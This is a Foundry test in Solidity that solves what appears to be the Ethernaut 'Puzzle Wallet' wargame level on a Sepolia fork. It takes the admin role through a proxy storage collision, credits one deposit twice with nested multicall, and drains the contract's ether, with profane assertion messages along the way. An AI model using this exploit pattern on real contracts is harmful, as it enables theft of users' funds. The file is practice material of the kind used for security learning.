// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;
// pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Ipuzzle} from "../../src/ethernaut/puzzle.sol";

contract testPuzzle is Test {
    address proxy = 0x605f5BDC2CA9dc9531579A49dCFc2Ae3f7Ad4631;
    Ipuzzle puzzle = Ipuzzle(proxy);
    string sepolia = vm.envString("sepolia_url");
    address me = 0x4948F43e559A38C1fDbeB2d7C5476d3c0Bda15E7;
    uint fork;

    function setUp() public {
        // create a fork and activate it ;
        fork = vm.createFork(sepolia);
        vm.selectFork(fork);
        vm.deal(me, 1 ether);
    }

    function test__takeTheAdminRoll() public {
        assertEq(fork, vm.activeFork());
        // call the funtion proposeNewAdmin;
        (bool ok, ) = proxy.call(
            abi.encodeWithSignature("proposeNewAdmin(address)", me)
        );
        assertTrue(ok, "it's fucking falseeeeeeee");
        // check the owner :
        (, bytes memory data) = proxy.staticcall(
            abi.encodeWithSignature("owner()")
        );
        address owner = abi.decode(data, (address));
        assertEq(owner, me);
        vm.startPrank(me);
        // become a whitelisted;
        puzzle.addToWhitelist(me);
        assertTrue(
            puzzle.whitelisted(me),
            "couldn't become a whiteListed, bitch "
        );
        // set the variables to call multicall;
        bytes[2] memory arg = encodeData();
        bytes[] memory args = new bytes[](2);
        args[0] = arg[0];
        args[1] = arg[1];

        // call multicall passing the data : to understand what happning here :
        ///first we call the multicall passing the data to call the deposit function in index 0 of our array of bytes
        ///0.001 ether with the call , since deposit adding the msg.value to our balance we send
        ///second we call the multicall again passing the data of the deposit , so the multicall will call multicall ,WTF hahahaha
        /// yea that's to skeep the bool that not allow us to call deposit through multicall more then once , so the multicall that we called
        /// it through multicall will add more 0,001 ether to our balance ,so ourbalance is 0.002 and contract balance is 0.002;
        puzzle.multicall{value: 0.001 ether}(args);

        assertEq(
            address(puzzle).balance,
            puzzle.balances(me),
            "nope you mutherfucker"
        );

        //call the excute function and withdraw all fund 0.002;
        puzzle.execute(me, 0.002 ether, ""); //this will drain all the funds from the contract
        assertEq(
            address(puzzle).balance,
            0,
            "balance did not update,check where the fuck you fucked it up -__- "
        );
        // here we can se the maxbalace;
        uint addressMe = uint(uint160(me));
        puzzle.setMaxBalance(addressMe);
        assertEq(puzzle.admin(), me, "you are not the fucking admin");
        console.log("*__* I'M THE FUCKING ADMIN NOW *__* ");
    }

    function encodeData() internal pure returns (bytes[2] memory args) {
        bytes[] memory arr = new bytes[](1);
        bytes memory selectorDeposit = abi.encodeWithSignature("deposit()");
        arr[0] = selectorDeposit;
        bytes memory selectorMulticall = abi.encodeWithSignature(
            "multicall(bytes[])",
            arr
        );
        args[0] = selectorDeposit;
        args[1] = selectorMulticall;
    }
}
